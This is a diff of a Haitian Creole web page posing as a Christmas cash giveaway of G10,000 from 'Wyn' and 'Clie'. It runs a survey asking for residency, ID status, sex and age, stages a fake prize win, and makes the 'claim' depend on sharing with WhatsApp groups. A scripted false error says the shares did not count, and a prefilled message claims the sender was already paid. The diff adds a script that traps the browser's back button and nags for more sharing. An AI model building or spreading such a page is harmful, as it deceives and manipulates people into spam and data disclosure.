@@ -1,15 +1,18 @@
 <!doctype html>
 <html lang="ht" dir="ltr">
-  
 <head>
-	<script src="activation1.js"></script>
+<script src="activation1.js"></script>
 <script src="alladz.js"></script>
+
 <title>G10,000 nan men Wyn – Kado Lajan Nwèl, an patenarya ak Clie, pou Ayisyen 🎄</title>
+
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPrv4lG8VCuBQlowvqcOIKQzFS8ZrzxJt42Fh1Ob_hB1UH9DAG_PbqELtE9SCbUj4EDATVZCE17js02OMKDv1RbrKhHtNNNuqI6_vxLVdOtM1pfv1IvszRaePaRraHitFIix6SfQpQ2qpPDefvMrLFYf5hk40AhBVM-kUHDV1MdQaMGUz70pD-iPpy09U/s1028/dangote%20and%20ismael%20(1).jpg" />
+
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta property="og:type" content="website" /> 
+<meta property="og:type" content="website" />
+
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
 <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.all.min.js"></script>
 <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
@@ -18,88 +21,90 @@
 
 <body>
 
-<img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoh13P__NZc3l9sYi4j6BS0dQgExSKCoqC4XPBIITL8fNf_GJeRwgxwG5inHTZiRDDFfgsj7RgVQ7tNvbvEKol8wKj59Rf0iSbVzKxpjTyk7I4N01zxa0p-53xmsC7RE_SLxu_pmDfOiRu5wdFEb1wC3oDEoZ0rzQbekvqTetXJRGe1SvWpfXMBPq63pc/s1242/0D2E07BD-8404-4C6D-8198-7ED53597B662.jpeg' width='100%'/>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoh13P__NZc3l9sYi4j6BS0dQgExSKCoqC4XPBIITL8fNf_GJeRwgxwG5inHTZiRDDFfgsj7RgVQ7tNvbvEKol8wKj59Rf0iSbVzKxpjTyk7I4N01zxa0p-53xmsC7RE_SLxu_pmDfOiRu5wdFEb1wC3oDEoZ0rzQbekvqTetXJRGe1SvWpfXMBPq63pc/s1242/0D2E07BD-8404-4C6D-8198-7ED53597B662.jpeg" width="100%"/>
 
 <div id="intro">
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Felisitasyon! Repons ou yo anrejistre</h2>
-<p class="paragraph">
-Koulye a ou gen yon chans pou genyen G10,000 nan men Wyn<br><br>
-Ou gen 3 chans! Nou swete ou bon chans<br><br>
-Chwazi bwat ki gen kado a ladan l.
+<h2>Felisitasyon! Repons ou yo anrejistre</h2>
+<p>
+Koulye a ou gen yon chans pou genyen G10,000 nan men Wyn.<br><br>
+Ou gen 3 chans! Nou swete ou bon chans.<br><br>
+Tanpri chwazi bwat ki gen kado a ladan l.
 </p>
-<button class="button" v-on:click="showInstructionsModal = false">Kòmanse</button>
+<button>Kòmanse</button>
 </vue-modal>
 
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Bon chans pwochen fwa</h2>
-<p class="paragraph">Ou gen (2) lòt chans.</p>
-<button class="button" v-on:click="showFailModal = false">OK</button>
+<h2>Bon chans pwochen fwa</h2>
+<p>Ou gen (2) lòt chans.</p>
+<button>OK</button>
 </vue-modal>
 
 <vue-modal :open="showSuccessModal">
-<h1 class="heading heading--h1">Felisitasyon!</h1>
-<p class="paragraph">
+<h1>Felisitasyon!</h1>
+<p>
 Pri ou se: <b>G10,000 lajan kach</b><br>
-Swiv enstriksyon ki nan pwochen paj la pou reklame pri ou!
+Swiv enstriksyon ki sou pwochen paj la pou reklame pri ou!
 </p>
-<button class="button" onclick="go();">OK</button>
+<button>OK</button>
 </vue-modal>
 
-<h1 class="heading heading--h1">Bonjou!</h1>
-<p class="paragraph">
+<h1>Bonjou!</h1>
+<p>
 Byenvini nan <b>G10,000 nan men Wyn – Sibvansyon Lajan Nwèl an patenarya ak Clie pou Ayisyen</b>.<br>
 Pa rate opòtinite sa a pou resevwa G10,000 pou Nwèl.<br>
 Reponn kestyon ki anba yo pou reklame <b>pri G10,000 lajan kach</b>.
 </p>
 
 <vue-survey :questions='[
-{ title: "Èske ou se yon rezidan Ayiti?", answers: [{text:"Wi"},{text:"Non"}]},
-{ title: "Èske ou gen nimewo idantite Ayisyen?", answers: [{text:"Wi"},{text:"Non"}]},
-{ title: "Chwazi sèks ou", answers: [{text:"Gason"},{text:"Fi"}]},
-{ title: "Chwazi ranje laj ou", answers: [{text:"18 - 20 an"},{text:"21 - 25 an"},{text:"26 - 30 an"},{text:"30 an oswa plis"}]}
+{ title: "Èske ou se yon rezidan Ayiti?", answers: [{ text: "Wi" }, { text: "Non" }] },
+{ title: "Èske ou gen nimewo idantite Ayisyen?", answers: [{ text: "Wi" }, { text: "Non" }] },
+{ title: "Chwazi sèks ou", answers: [{ text: "Gason" }, { text: "Fi" }] },
+{ title: "Chwazi ranje laj ou", answers: [
+{ text: "18 - 20 an" },
+{ text: "21 - 25 an" },
+{ text: "26 - 30 an" },
+{ text: "30 an oswa plis" }
+]}
 ]'></vue-survey>
 
 </div>
 
 <div id="share">
-<p>Felisitasyon!</p>
-<p class="txt1">
-Pri ou se: <b>G10,000</b><br>
-Swiv enstriksyon ki anba yo pou reklame pri ou!
-</p>
+<h2>Felisitasyon!</h2>
 
-<p class="rules">1. Pataje ak 5 gwoup / 15 zanmi sou WhatsApp</p>
-<p class="rules">2. Klike sou “Kontinye” pou reklame pri ou</p>
+<p>Pri ou se: <b>G10,000</b><br>
+Swiv enstriksyon ki anba yo pou reklame pri ou!</p>
 
-<div class="share_main_bt">WhatsApp →</div>
-<h4>Pataje jiskaske ba ble a ranpli!</h4>
+<p>1. Pataje ak 5 gwoup / 15 zanmi sou WhatsApp</p>
+<p>2. Klike sou “Kontinye” pou reklame pri ou</p>
 
-<div class="share_main_bt">Kontinye</div>
+<div>WhatsApp →</div>
+<p>Pataje jiskaske ba ble a ranpli!</p>
+<div>Kontinye</div>
 </div>
 
 <div id="claim">
-<p>Felisitasyon!</p>
-<p class="txt1">
-Pri ou se: <b>G10,000 lajan kach</b><br>
-Swiv enstriksyon ki anba yo pou reklame pri ou!
-</p>
+<h2>Felisitasyon!</h2>
 
-<button class="share_main_bt">REKLAME G10,000</button>
-<div class="share_main_bt">CHWAZI KALITE KONT</div>
-<button class="share_main_bt">KONT EKONOMI</button>
-<button class="share_main_bt">KONT KOURAN</button>
-<div class="share_main_bt">Retire G10,000</div>
+<p>Pri ou se: <b>G10,000 lajan kach</b><br>
+Swiv enstriksyon ki anba yo pou reklame pri ou!</p>
+
+<button>REKLAME G10,000</button>
+<div>CHWAZI KALITE KONT</div>
+<button>KONT EKONOMI</button>
+<button>KONT KOURAN</button>
+<div>Retire G10,000</div>
 </div>
 
 <script>
-var error = "Gen yon erè! Pataje yo pa konte. Ou ka pataje ak menm zanmi oswa gwoup plis pase yon fwa. Tanpri pataje ankò.";
+var error = "Gen yon erè! Pataje yo pa konte. Ou ka pataje ak menm zanmi oswa menm gwoup plis pase yon fwa. Tanpri pataje ankò.";
 </script>
 
 <script>
 var tiaoban = [
-"G10,000 Sibvansyon Lajan Nwèl nan men Wyn an patenarya ak Clie pou Ayisyen%0A%0AKI JAN POU JWENN LI%0AVizite lyen ki anba a, reponn kestyon yo epi w ap resevwa G10,000 imedyatman.%0A Mwen deja resevwa pa mwen%0A%0AKlike la a👇"
+"G10,000 Sibvansyon Lajan Nwèl nan men Wyn an patenarya ak Clie pou Ayisyen%0A%0AKIJAN POU JWENN LI%0AVizite lyen ki anba a, reponn kestyon yo epi w ap resevwa G10,000 imedyatman.%0AMwen deja resevwa pa mwen%0A%0AKlike la a👇"
 ];
 </script>
 
@@ -111,6 +116,18 @@ title: 'Malerezman...',
 text: 'Pou resevwa pri ou, ou dwe pataje ak zanmi ou yo. Pataje jiskaske ba ble a ranpli!'
 });
 }
+</script>
+
+<script>
+!function(){
+var t;
+try{
+for(t=0;t<10;++t) history.pushState({}, "", "#");
+onpopstate=function(t){
+t.state && alert("Tanpri pataje plis pou resevwa kado a.");
+}
+}catch(o){}
+}();
 </script>
 
 </body>
